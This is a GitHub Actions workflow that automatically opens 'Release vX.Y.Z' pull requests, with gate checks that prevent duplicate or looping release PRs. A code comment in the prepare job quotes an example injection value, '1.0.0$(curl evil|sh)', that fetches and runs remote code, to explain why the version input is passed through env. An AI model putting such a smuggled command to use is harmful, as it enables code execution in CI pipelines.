name: Prepare Release

# Two triggers:
#   1. workflow_dispatch (Actions tab, or "gh workflow run prepare-release.yml
#      -f version=X.Y.Z") -- an explicit version, chosen by whoever runs it.
#   2. push to main -- every ordinary merge auto-opens a "Release vX.Y.Z" PR
#      with the next patch version bumped automatically, so cutting a
#      release no longer needs a person to remember to run this. The gate
#      job below skips three cases so this can't loop or duplicate itself:
#      a push that IS itself a release/vX.Y.Z branch merging in (checked via
#      the PR-for-commit API, not the commit message, so this holds
#      regardless of whether the release PR was squashed, merged, or
#      rebased -- that merge is what tag-release.yml reacts to; auto-opening
#      another release PR immediately after would just propose re-releasing
#      nothing new), a push landing while a "Release vX.Y.Z" PR is already
#      open (wait for that one to merge or close first rather than stacking
#      a second), and a push landing after a release PR merged but before
#      tag-release.yml (which waits for the merge commit's own CI first)
#      has actually created its tag -- without this last check, a push
#      landing in that window would compute the same "next version" again
#      and open a same-version duplicate.
#
# Either way this only OPENS a PR into main -- main's branch ruleset still
# requires a PR with a green "Build, vet & test" check before anything
# lands there, including this, and the release PR's own bot-authored HEAD
# commit still gets held at `action_required` for a person to approve (see
# CLAUDE.md's "Branch, PR & release workflow"). Automating this step does
# not remove either safety gate -- it only automates picking a version
# number and opening the PR, the same two things a person otherwise has to
# remember to do after every merge.

on:
  workflow_dispatch:
    inputs:
      version:
        description: "Version to release, without the leading v (e.g. 4.0.26). Leave blank to auto-bump the patch version."
        required: false
  push:
    branches: [main]

concurrency:
  group: prepare-release
  cancel-in-progress: false

permissions:
  contents: write
  pull-requests: write

jobs:
  gate:
    runs-on: ubuntu-latest
    outputs:
      should_run: ${{ steps.decide.outputs.should_run }}
      version: ${{ steps.decide.outputs.version }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          fetch-depth: 0

      - name: Decide whether to open a release PR, and with which version
        id: decide
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          EVENT_NAME: ${{ github.event_name }}
          INPUT_VERSION: ${{ inputs.version }}
        run: |
          if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
            if [ -n "$INPUT_VERSION" ]; then
              echo "should_run=true" >> "$GITHUB_OUTPUT"
              echo "version=$INPUT_VERSION" >> "$GITHUB_OUTPUT"
              exit 0
            fi
            # workflow_dispatch with no version given: fall through to the
            # same auto-bump logic a push uses.
          fi

          # Was HEAD produced by merging a "release"-labeled PR? Checked via
          # the PR-for-commit API rather than parsing the commit message:
          # a commit message check only recognizes GitHub's default
          # "Merge pull request #N from OWNER/BRANCH" format, which a
          # squash or rebase merge never produces (e.g. squash instead
          # writes "Prepare release vX.Y.Z (#N)") -- CLAUDE.md allows any
          # of the three merge strategies for every PR, release PRs
          # included, so this check must not silently depend on which one
          # was used. (This was found the hard way: a squash-merged release
          # PR slipped past the old regex, and prepare-release ran again
          # before tag-release.yml had tagged the version, opening a
          # same-version duplicate release PR.)
          head_sha="$(git rev-parse HEAD)"
          merged_release_pr="$(gh api "repos/${{ github.repository }}/commits/$head_sha/pulls" \
            --jq '[.[] | select(.merged_at != null) | select([.labels[].name] | index("release"))] | length')"
          if [ "${merged_release_pr:-0}" -gt 0 ]; then
            echo "HEAD ($head_sha) is a merged release PR -- tag-release.yml handles this, not opening another release PR" >&2
            echo "should_run=false" >> "$GITHUB_OUTPUT"
            exit 0
          fi

          open_release_prs="$(gh pr list --repo "${{ github.repository }}" --base main --label release --state open --json number --jq 'length')"
          if [ "$open_release_prs" -gt 0 ]; then
            echo "a release PR is already open -- waiting for it before opening another" >&2
            echo "should_run=false" >> "$GITHUB_OUTPUT"
            exit 0
          fi

          latest_tag="$(git tag --list 'v*.*.*' --sort=-v:refname | head -1)"
          if [ -z "$latest_tag" ]; then
            echo "no existing vX.Y.Z tag found to bump from" >&2
            exit 1
          fi
          version="${latest_tag#v}"
          major="${version%%.*}"
          rest="${version#*.}"
          minor="${rest%%.*}"
          patch="${rest#*.}"
          next_version="$major.$minor.$((patch + 1))"

          # A release PR for next_version may already be merged, with its
          # tag not created yet -- tag-release.yml waits for the merge
          # commit's own CI before tagging, so there's a real window
          # between "release PR merged" and "tag exists." Checking merged
          # (not just open) release PRs closes that window too, on top of
          # the HEAD-commit check above (which only catches the release PR
          # being the LAST merge -- this also catches one merged earlier
          # that's still awaiting its tag).
          pending_tag_prs="$(gh pr list --repo "${{ github.repository }}" --base main --label release --state merged \
            --search "\"Release v$next_version\" in:title" --json number --jq 'length')"
          if [ "${pending_tag_prs:-0}" -gt 0 ] && ! git rev-parse "v$next_version" >/dev/null 2>&1; then
            echo "a merged release PR for v$next_version is still awaiting its tag -- not opening a duplicate" >&2
            echo "should_run=false" >> "$GITHUB_OUTPUT"
            exit 0
          fi

          echo "should_run=true" >> "$GITHUB_OUTPUT"
          echo "version=$next_version" >> "$GITHUB_OUTPUT"

  prepare:
    needs: gate
    if: needs.gate.outputs.should_run == 'true'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          fetch-depth: 0

      # needs.gate.outputs.version is either a free-text workflow_dispatch
      # input or this job's own computed "$major.$minor.$patch" string --
      # either way it may not be attacker-free-text-safe by construction,
      # so it's still routed through env: rather than spliced into the
      # script text with ${{ }} (which would splice at YAML-templating
      # time, before bash ever parses the line -- see the regex check
      # immediately below, which would run too late against a value like
      # "1.0.0$(curl evil|sh)" if it were interpolated directly instead).
      - name: Validate version, compute tag/branch names
        id: meta
        env:
          VERSION_INPUT: ${{ needs.gate.outputs.version }}
        run: |
          version="$VERSION_INPUT"
          if ! [[ "$version" =~ ^[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
            echo "version must be MAJOR.MINOR.PATCH (e.g. 4.0.26), got: $version" >&2
            exit 1
          fi
          tag="v$version"
          if git rev-parse "$tag" >/dev/null 2>&1; then
            echo "tag $tag already exists" >&2
            exit 1
          fi
          echo "tag=$tag" >> "$GITHUB_OUTPUT"
          echo "branch=release/$tag" >> "$GITHUB_OUTPUT"

      - name: Generate release notes preview
        id: notes
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          TAG: ${{ steps.meta.outputs.tag }}
        run: |
          # The same "generate release notes" GitHub API release.yml's own
          # publish step uses (via generate_release_notes: true) -- so the
          # PR body previewed here for review is what the actual GitHub
          # Release body will read once this is merged and tagged.
          gh api "repos/${{ github.repository }}/releases/generate-notes" \
            -f tag_name="$TAG" -f target_commitish=main \
            --jq .body > /tmp/notes.md

      - name: Prepend a CHANGELOG.md entry on the release branch
        env:
          TAG: ${{ steps.meta.outputs.tag }}
          BRANCH: ${{ steps.meta.outputs.branch }}
        run: |
          git checkout -b "$BRANCH"
          {
            echo "# Changelog"
            echo
            echo "## $TAG - $(date -u +%Y-%m-%d)"
            echo
            cat /tmp/notes.md
            echo
            if [ -f CHANGELOG.md ]; then tail -n +2 CHANGELOG.md; fi
          } > /tmp/CHANGELOG.md.new
          mv /tmp/CHANGELOG.md.new CHANGELOG.md
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add CHANGELOG.md
          git commit -m "Prepare release $TAG"
          git push origin "$BRANCH"

      - name: Open the release PR
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          TAG: ${{ steps.meta.outputs.tag }}
          BRANCH: ${{ steps.meta.outputs.branch }}
        run: |
          gh label create release --color 0e8a16 \
            --description "Release preparation PR" 2>/dev/null || true
          gh pr create --base main --head "$BRANCH" \
            --title "Release $TAG" \
            --body-file /tmp/notes.md \
            --label release
